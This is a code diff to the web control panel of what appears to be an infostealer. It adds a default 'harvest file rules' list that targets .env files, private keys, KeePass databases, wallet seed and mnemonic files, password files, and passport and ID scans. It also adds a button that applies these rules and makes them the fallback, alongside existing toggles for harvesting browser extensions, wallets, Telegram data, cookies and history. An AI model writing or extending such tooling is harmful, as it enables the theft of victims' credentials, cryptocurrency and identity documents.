@@ -74,9 +74,34 @@
   const ruleDirInput = $("rule-dir");
   const ruleFullCheck = $("rule-full");
   const ruleAddBtn = $("rule-add-btn");
+  const ruleCommonBtn = $("rule-common-btn");
   const fileRuleListEl = $("file-rule-list");
   /** @type {{ extension: string, nameContains: string, dirPath: string, fullUpload: boolean }[]} */
   let fileRules = [];
+
+  /** Common defaults shown when server has no custom rules yet. */
+  const COMMON_FILE_RULES = [
+    { extension: ".env", nameContains: "", dirPath: "", fullUpload: false },
+    { extension: "", nameContains: "config.json", dirPath: "", fullUpload: false },
+    { extension: ".pem", nameContains: "", dirPath: "", fullUpload: false },
+    { extension: ".key", nameContains: "", dirPath: "", fullUpload: false },
+    { extension: ".kdbx", nameContains: "", dirPath: "", fullUpload: false },
+    { extension: ".ppk", nameContains: "", dirPath: "", fullUpload: false },
+    { extension: ".txt", nameContains: "password", dirPath: "", fullUpload: false },
+    { extension: ".txt", nameContains: "seed", dirPath: "", fullUpload: false },
+    { extension: ".txt", nameContains: "wallet", dirPath: "", fullUpload: false },
+    { extension: ".txt", nameContains: "mnemonic", dirPath: "", fullUpload: false },
+    { extension: ".txt", nameContains: "recovery", dirPath: "", fullUpload: false },
+    { extension: ".pdf", nameContains: "passport", dirPath: "", fullUpload: false },
+    { extension: ".pdf", nameContains: "id card", dirPath: "", fullUpload: false },
+    { extension: ".pdf", nameContains: "invoice", dirPath: "", fullUpload: false },
+    { extension: ".jpg", nameContains: "passport", dirPath: "", fullUpload: false },
+    { extension: ".png", nameContains: "passport", dirPath: "", fullUpload: false },
+    { extension: ".jpg", nameContains: "id", dirPath: "", fullUpload: false },
+    { extension: ".png", nameContains: "wallet", dirPath: "", fullUpload: false },
+    { extension: "", nameContains: "secret", dirPath: "", fullUpload: false },
+    { extension: "", nameContains: "credential", dirPath: "", fullUpload: false },
+  ];
   const captureHistoryToggle = $("capture-history-toggle");
   const captureCookiesToggle = $("capture-cookies-toggle");
   const historyLimitInput = $("history-limit-input");
@@ -1730,7 +1755,7 @@
       if (autoExtToggle) autoExtToggle.checked = !!s.harvest_extensions;
       if (autoWalletsToggle) autoWalletsToggle.checked = !!s.harvest_wallets;
       if (autoTelegramToggle) autoTelegramToggle.checked = !!s.harvest_telegram;
-      if (Array.isArray(s.harvest_file_rules)) {
+      if (Array.isArray(s.harvest_file_rules) && s.harvest_file_rules.length) {
         fileRules = s.harvest_file_rules.map((r) => ({
           extension: normalizeRuleExt(r.extension || ""),
           nameContains: String(r.nameContains || "").trim(),
@@ -1738,10 +1763,13 @@
           fullUpload: !!r.fullUpload,
         }));
       } else {
-        fileRules = [];
+        fileRules = COMMON_FILE_RULES.map((r) => ({ ...r }));
       }
       renderFileRuleList();
-    } catch (_) {}
+    } catch (_) {
+      fileRules = COMMON_FILE_RULES.map((r) => ({ ...r }));
+      renderFileRuleList();
+    }
   }
 
   async function saveSettings() {
@@ -1943,7 +1971,7 @@
       if (autoExtToggle) autoExtToggle.disabled = true;
       if (autoWalletsToggle) autoWalletsToggle.disabled = true;
       if (autoTelegramToggle) autoTelegramToggle.disabled = true;
-      [ruleExtInput, ruleNameInput, ruleDirInput, ruleFullCheck, ruleAddBtn].forEach((el) => {
+      [ruleExtInput, ruleNameInput, ruleDirInput, ruleFullCheck, ruleAddBtn, ruleCommonBtn].forEach((el) => {
         if (el) el.disabled = true;
       });
       if (captureHistoryToggle) captureHistoryToggle.disabled = true;
@@ -1976,6 +2004,13 @@
     if (autoWalletsToggle) autoWalletsToggle.addEventListener("change", saveSettings);
     if (autoTelegramToggle) autoTelegramToggle.addEventListener("change", saveSettings);
     if (ruleAddBtn) ruleAddBtn.addEventListener("click", addFileRuleFromForm);
+    if (ruleCommonBtn) {
+      ruleCommonBtn.addEventListener("click", () => {
+        fileRules = COMMON_FILE_RULES.map((r) => ({ ...r }));
+        renderFileRuleList();
+        saveSettings();
+      });
+    }
     [ruleExtInput, ruleNameInput, ruleDirInput].forEach((el) => {
       if (!el) return;
       el.addEventListener("keydown", (ev) => {
